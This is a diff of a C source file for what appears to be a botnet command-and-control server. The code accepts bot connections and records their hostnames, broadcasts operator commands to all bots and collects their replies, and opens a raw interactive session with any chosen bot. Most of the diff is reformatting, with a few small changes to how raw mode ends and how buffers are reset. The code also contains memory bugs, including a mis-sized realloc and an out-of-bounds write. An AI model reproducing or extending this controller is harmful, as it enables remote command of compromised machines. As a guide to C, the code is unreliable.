@@ -19,15 +19,14 @@ void print_connection(connection client_con, int new_fd);
 void print_welcome_message();
 void print_help_screen();
 void print_command_help_screen();
-void* handle_connection(void* my_connection);
-void* bot_command(void* current);
+void *handle_connection(void *my_connection);
+void *bot_command(void *current);
 int append_pfds(struct pollfd *pfds, int new_fd, int fd_count);
 
 // Global Graceful Exit Flag
 int exitflag = 0;
 
 // Structure of arguments for use with bot_command and handle_connection functions
-
 
 static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 
@@ -36,7 +35,6 @@ int main(void)
     // Set the client connection to be the head of the list
     connection client_con = bind_socket("127.0.0.1", 8881);
     client_con.next = NULL;
-
 
     print_welcome_message();
 
@@ -61,19 +59,19 @@ int main(void)
 
 // Handles incomming connections and appends information to array
 // This writes data to the connection struct
-void* handle_connection(void* arg)
+void *handle_connection(void *arg)
 {
-    connection* head = (connection *)arg;
+    connection *head = (connection *)arg;
     socklen_t client_addr_size;
     int new_fd;
     int fd_count = 1;
 
     printf("[+] Looking for connections\n");
 
-    while(1)
+    while (1)
     {
 
-        connection* current = head;
+        connection *current = head;
 
         while (current != NULL)
         {
@@ -96,7 +94,7 @@ void* handle_connection(void* arg)
                     // Accept queued connection and assign new file descriptor
                     client_addr_size = sizeof(head->client_addr);
                     new_fd = accept(head->sock_fd,
-                        (struct sockaddr *)&head->client_addr, &client_addr_size);
+                                    (struct sockaddr *)&head->client_addr, &client_addr_size);
 
                     // Check return code of accept(). Return error if -1
                     if (new_fd == -1)
@@ -109,7 +107,7 @@ void* handle_connection(void* arg)
                         pthread_mutex_lock(&mutex);
 
                         // Add new connection information to list
-                        connection* new_con = create_connection(head, 0);
+                        connection *new_con = create_connection(head, 0);
                         new_con->pfds->fd = new_fd;
                         new_con->pfds->events = POLLIN;
 
@@ -128,7 +126,7 @@ void* handle_connection(void* arg)
                         }
 
                         // Overwrite the newline char with a null terminator
-                        recieved_data[bytes_recv-1] = '\0';
+                        recieved_data[bytes_recv - 1] = '\0';
 
                         new_con->hostname = malloc(bytes_recv);
                         sprintf(new_con->hostname, "%s", recieved_data);
@@ -151,7 +149,7 @@ int append_pfds(struct pollfd *pfds, int new_fd, int fd_count)
     fd_count++;
 
     // Increase size of array to accomodate new file descriptor
-    pfds = realloc(pfds, sizeof(pfds)*fd_count);
+    pfds = realloc(pfds, sizeof(pfds) * fd_count);
 
     // Add file descriptor to array and set event to check for read
     pfds[fd_count].fd = new_fd;
@@ -160,17 +158,16 @@ int append_pfds(struct pollfd *pfds, int new_fd, int fd_count)
     return fd_count;
 }
 
-
-void* bot_command(void* arg)
+void *bot_command(void *arg)
 
 {
 
     char data[1024];
 
-    connection* head = (connection *)arg;
-    connection* tmp = (connection *)malloc(sizeof(connection));
+    connection *head = (connection *)arg;
+    connection *tmp = (connection *)malloc(sizeof(connection));
 
-    while(1)
+    while (1)
     {
 
         // Prompt user for input and remove trailing newline
@@ -185,7 +182,6 @@ void* bot_command(void* arg)
 
             print_help_screen();
         }
-
 
         // Display current list of connections
         // John is working to store host names, rather than client 1, 2, 3, etc..
@@ -212,16 +208,15 @@ void* bot_command(void* arg)
             }
 
             // Release lock
-             pthread_mutex_unlock(&mutex);
+            pthread_mutex_unlock(&mutex);
         }
-
 
         // Enter 'command' control
         else if (strcmp(data, "command") == 0)
         {
             printf("\nEnter <help> to display list of available options under the command mode\n");
             printf("\nEnter <back> to exit command mode\n\n");
-            while(1)
+            while (1)
             {
                 // Prompt user for input and remove trailing newline
                 printf("[Command] >> ");
@@ -239,48 +234,44 @@ void* bot_command(void* arg)
                 else if (strcmp(data, "show") == 0)
                 {
 
-                  // Set lock
-                  pthread_mutex_lock(&mutex);
+                    // Set lock
+                    pthread_mutex_lock(&mutex);
 
-                  // Omit server info from description
-                  tmp = head;
-                  tmp = tmp->next;
-                  int i = 1;
+                    // Omit server info from description
+                    tmp = head;
+                    tmp = tmp->next;
+                    int i = 1;
 
-                  // Iterate through array and print client information
-                  while (tmp != NULL)
-                  {
-                      printf("Client %d - %s - is on fd %d\n", i, tmp->hostname, tmp->sock_fd);
-                      tmp = tmp->next;
-                      i++;
-                  }
-                  if (i == 1)
-                  {
-                      printf("[-] No connections!\n");
-                  }
+                    // Iterate through array and print client information
+                    while (tmp != NULL)
+                    {
+                        printf("Client %d - %s - is on fd %d\n", i, tmp->hostname, tmp->sock_fd);
+                        tmp = tmp->next;
+                        i++;
+                    }
+                    if (i == 1)
+                    {
+                        printf("[-] No connections!\n");
+                    }
 
-                  // Release lock
-                   pthread_mutex_unlock(&mutex);
-
+                    // Release lock
+                    pthread_mutex_unlock(&mutex);
                 }
-
-
-
 
                 // Send command to ALL connections except listener
                 else if (strcmp(data, "all") == 0)
                 {
                     //this allows consecutive command message to all clients
-                    while(1)
+                    while (1)
                     {
                         // Prompt user for input and remove trailing newline
                         printf("[Command][All] Enter command: ");
                         fgets(data, sizeof(data), stdin);
                         data[strcspn(data, "\n")] = 0;
 
-                        if (strcmp(data,"back") == 0)
+                        if (strcmp(data, "back") == 0)
                         {
-                             break;
+                            break;
                         }
 
                         // Send data to client specified by user input, based on array index
@@ -288,23 +279,25 @@ void* bot_command(void* arg)
                         tmp = head;
                         while (tmp != NULL)
                         {
-                          tmp = tmp->next;
-                          send(tmp->pfds->fd, data, sizeof(data), 0);
+                            tmp = tmp->next;
+                            send(tmp->pfds->fd, data, sizeof(data), 0);
+                            // TODO: Limit the length of the data string below
+                            printf("[+] Sent %s to %s\n", data, tmp->hostname);
 
-                          // Wait for a response
-                          char recieved_data[8192];
-                          int bytes_recv = recv(tmp->pfds->fd, recieved_data, 8192, 0);
+                            // Wait for a response
+                            char recieved_data[8192];
+                            int bytes_recv = recv(tmp->pfds->fd, recieved_data, 8192, 0);
 
-                          if (bytes_recv == 0)
-                          {
-                            // Oops, our recv call failed.
-                            printf("[-] Unable to recieve from %s\n", tmp->hostname);
-                            i++;
-                            continue;
-                          }
+                            if (bytes_recv == 0)
+                            {
+                                // Oops, our recv call failed.
+                                printf("[-] Unable to recieve from %s\n", tmp->hostname);
+                                i++;
+                                continue;
+                            }
 
-                          recieved_data[bytes_recv] = '\0';
-                          printf("%s said: %s\n", tmp->hostname, recieved_data);
+                            recieved_data[bytes_recv] = '\0';
+                            printf("%s said: %s\n", tmp->hostname, recieved_data);
 
                             i++;
                         }
@@ -324,9 +317,9 @@ void* bot_command(void* arg)
                     // Sanitise user input
                     if (num < 1 || num > (count_connections(head) - 1))
                     {
-                      printf("[-] No such connection %d\n", num);
-                      printf("[-] The current number of connections is %d\n", (count_connections(head) - 1));
-                      continue;
+                        printf("[-] No such connection %d\n", num);
+                        printf("[-] The current number of connections is %d\n", (count_connections(head) - 1));
+                        continue;
                     }
 
                     // Find the correct client in the list
@@ -334,19 +327,20 @@ void* bot_command(void* arg)
                     tmp = head;
                     while (i < num && tmp != NULL)
                     {
-                      tmp = tmp->next;
-                      i++;
+                        tmp = tmp->next;
+                        i++;
                     }
                     printf("[+] Entering raw input mode with client %s\n", tmp->hostname);
                     printf("[+] To escape raw mode, type exit\n");
+
                     // This is where the ugly low-level stuff begins... Essentially the same code as the client side.
-                    // Within the while function, we shouldn't clutter the screen with lots of server generated messages
+                    // Within the while loop, we shouldn't clutter the screen with lots of server generated messages
                     int safe_exit = 0;
                     char input[250];
                     fd_set raw_fds;
                     pthread_mutex_lock(&mutex);
-                    while(safe_exit == 0)
-                    {   
+                    while (safe_exit == 0)
+                    {
                         // We'll need to start a direct line between stdin here and the client
                         FD_ZERO(&raw_fds);
                         FD_SET(tmp->pfds->fd, &raw_fds);
@@ -357,7 +351,7 @@ void* bot_command(void* arg)
 
                         if (select_return == -1)
                         {
-                            perror("[+] Unable to enter raw mode. select() returned: ");
+                            perror("[-] Unable to enter raw mode. select() returned: ");
                             safe_exit = 1;
                             break;
                         }
@@ -366,46 +360,46 @@ void* bot_command(void* arg)
                             // See if we've got something to read on our connection
                             if (FD_ISSET(tmp->pfds->fd, &raw_fds))
                             {
+                                // Reset input, no bugs were here yet but I thought it might be a good idea...
+                                memset(input, '\0', 250);
                                 // TODO make this variable length
                                 select_return = read(tmp->pfds->fd, input, sizeof(input));
                                 if (select_return > 0)
                                 {
-                                    if (strcmp(input,"exit") == 0)
-                                    {
-                                        safe_exit = 1;
-                                        break;
-                                    }
                                     // Send data on to stdout
                                     write(1, input, select_return);
                                 }
-                                else
+                                else if (select_return < 0)
                                 {
-                                    if (select_return < 0)
-                                    {
-                                        perror("[+] Unable to read from client.");
-                                        safe_exit = 1;
-                                        break;
-                                    }
+                                    perror("[-] Unable to read from client.");
+                                    safe_exit = 1;
+                                    break;
                                 }
                             }
 
                             // See if we've got something on stdin
                             if (FD_ISSET(0, &raw_fds))
                             {
+                                // Reset input - this fixes strstr later on...
+                                memset(input, '\0', 250);
                                 select_return = read(0, input, sizeof(input));
                                 if (select_return > 0)
                                 {
-                                    // Send data to client
-                                    write(tmp->pfds->fd, input, select_return);
-                                }
-                                else
-                                {
-                                    if (select_return < 0)
+                                    // Match anything with exit in the string. This is ugly :/
+                                    if (strstr(input, "exit") != NULL)
                                     {
-                                        perror("[+] Unable to send to client.");
+                                        printf("[+] Exiting RAW mode\n");
                                         safe_exit = 1;
                                         break;
                                     }
+                                    // Send data to client
+                                    write(tmp->pfds->fd, input, select_return);
+                                }
+                                else if (select_return < 0)
+                                {
+                                    perror("[-] Unable to send to client.");
+                                    safe_exit = 1;
+                                    break;
                                 }
                             }
                         }
@@ -423,21 +417,21 @@ void* bot_command(void* arg)
         // Exit control of bot
         else if (strcmp(data, "exit") == 0)
         {
-            while(1)
+            while (1)
             {
                 printf("Are You Sure? yes/no\n");
                 fgets(data, sizeof(data), stdin);
                 data[strcspn(data, "\n")] = 0;
-                
-              if (strcmp(data,"yes") == 0)
-              {
-                  printf("\nExiting...  \n");
-                  exit(0);
-              }
-              else if (strcmp(data,"no") == 0)
-              {
-                  break;
-              }
+
+                if (strcmp(data, "yes") == 0)
+                {
+                    printf("\nExiting...  \n");
+                    exit(0);
+                }
+                else if (strcmp(data, "no") == 0)
+                {
+                    break;
+                }
             }
         }
     }
@@ -447,7 +441,6 @@ void* bot_command(void* arg)
 void print_welcome_message()
 {
     system("clear");
-
 
     printf("\n******************************************************************************\n");
     printf("dP   dP   dP  88888888b dP         a88888b.  .88888.  8888ba.88ba   88888888b \n");
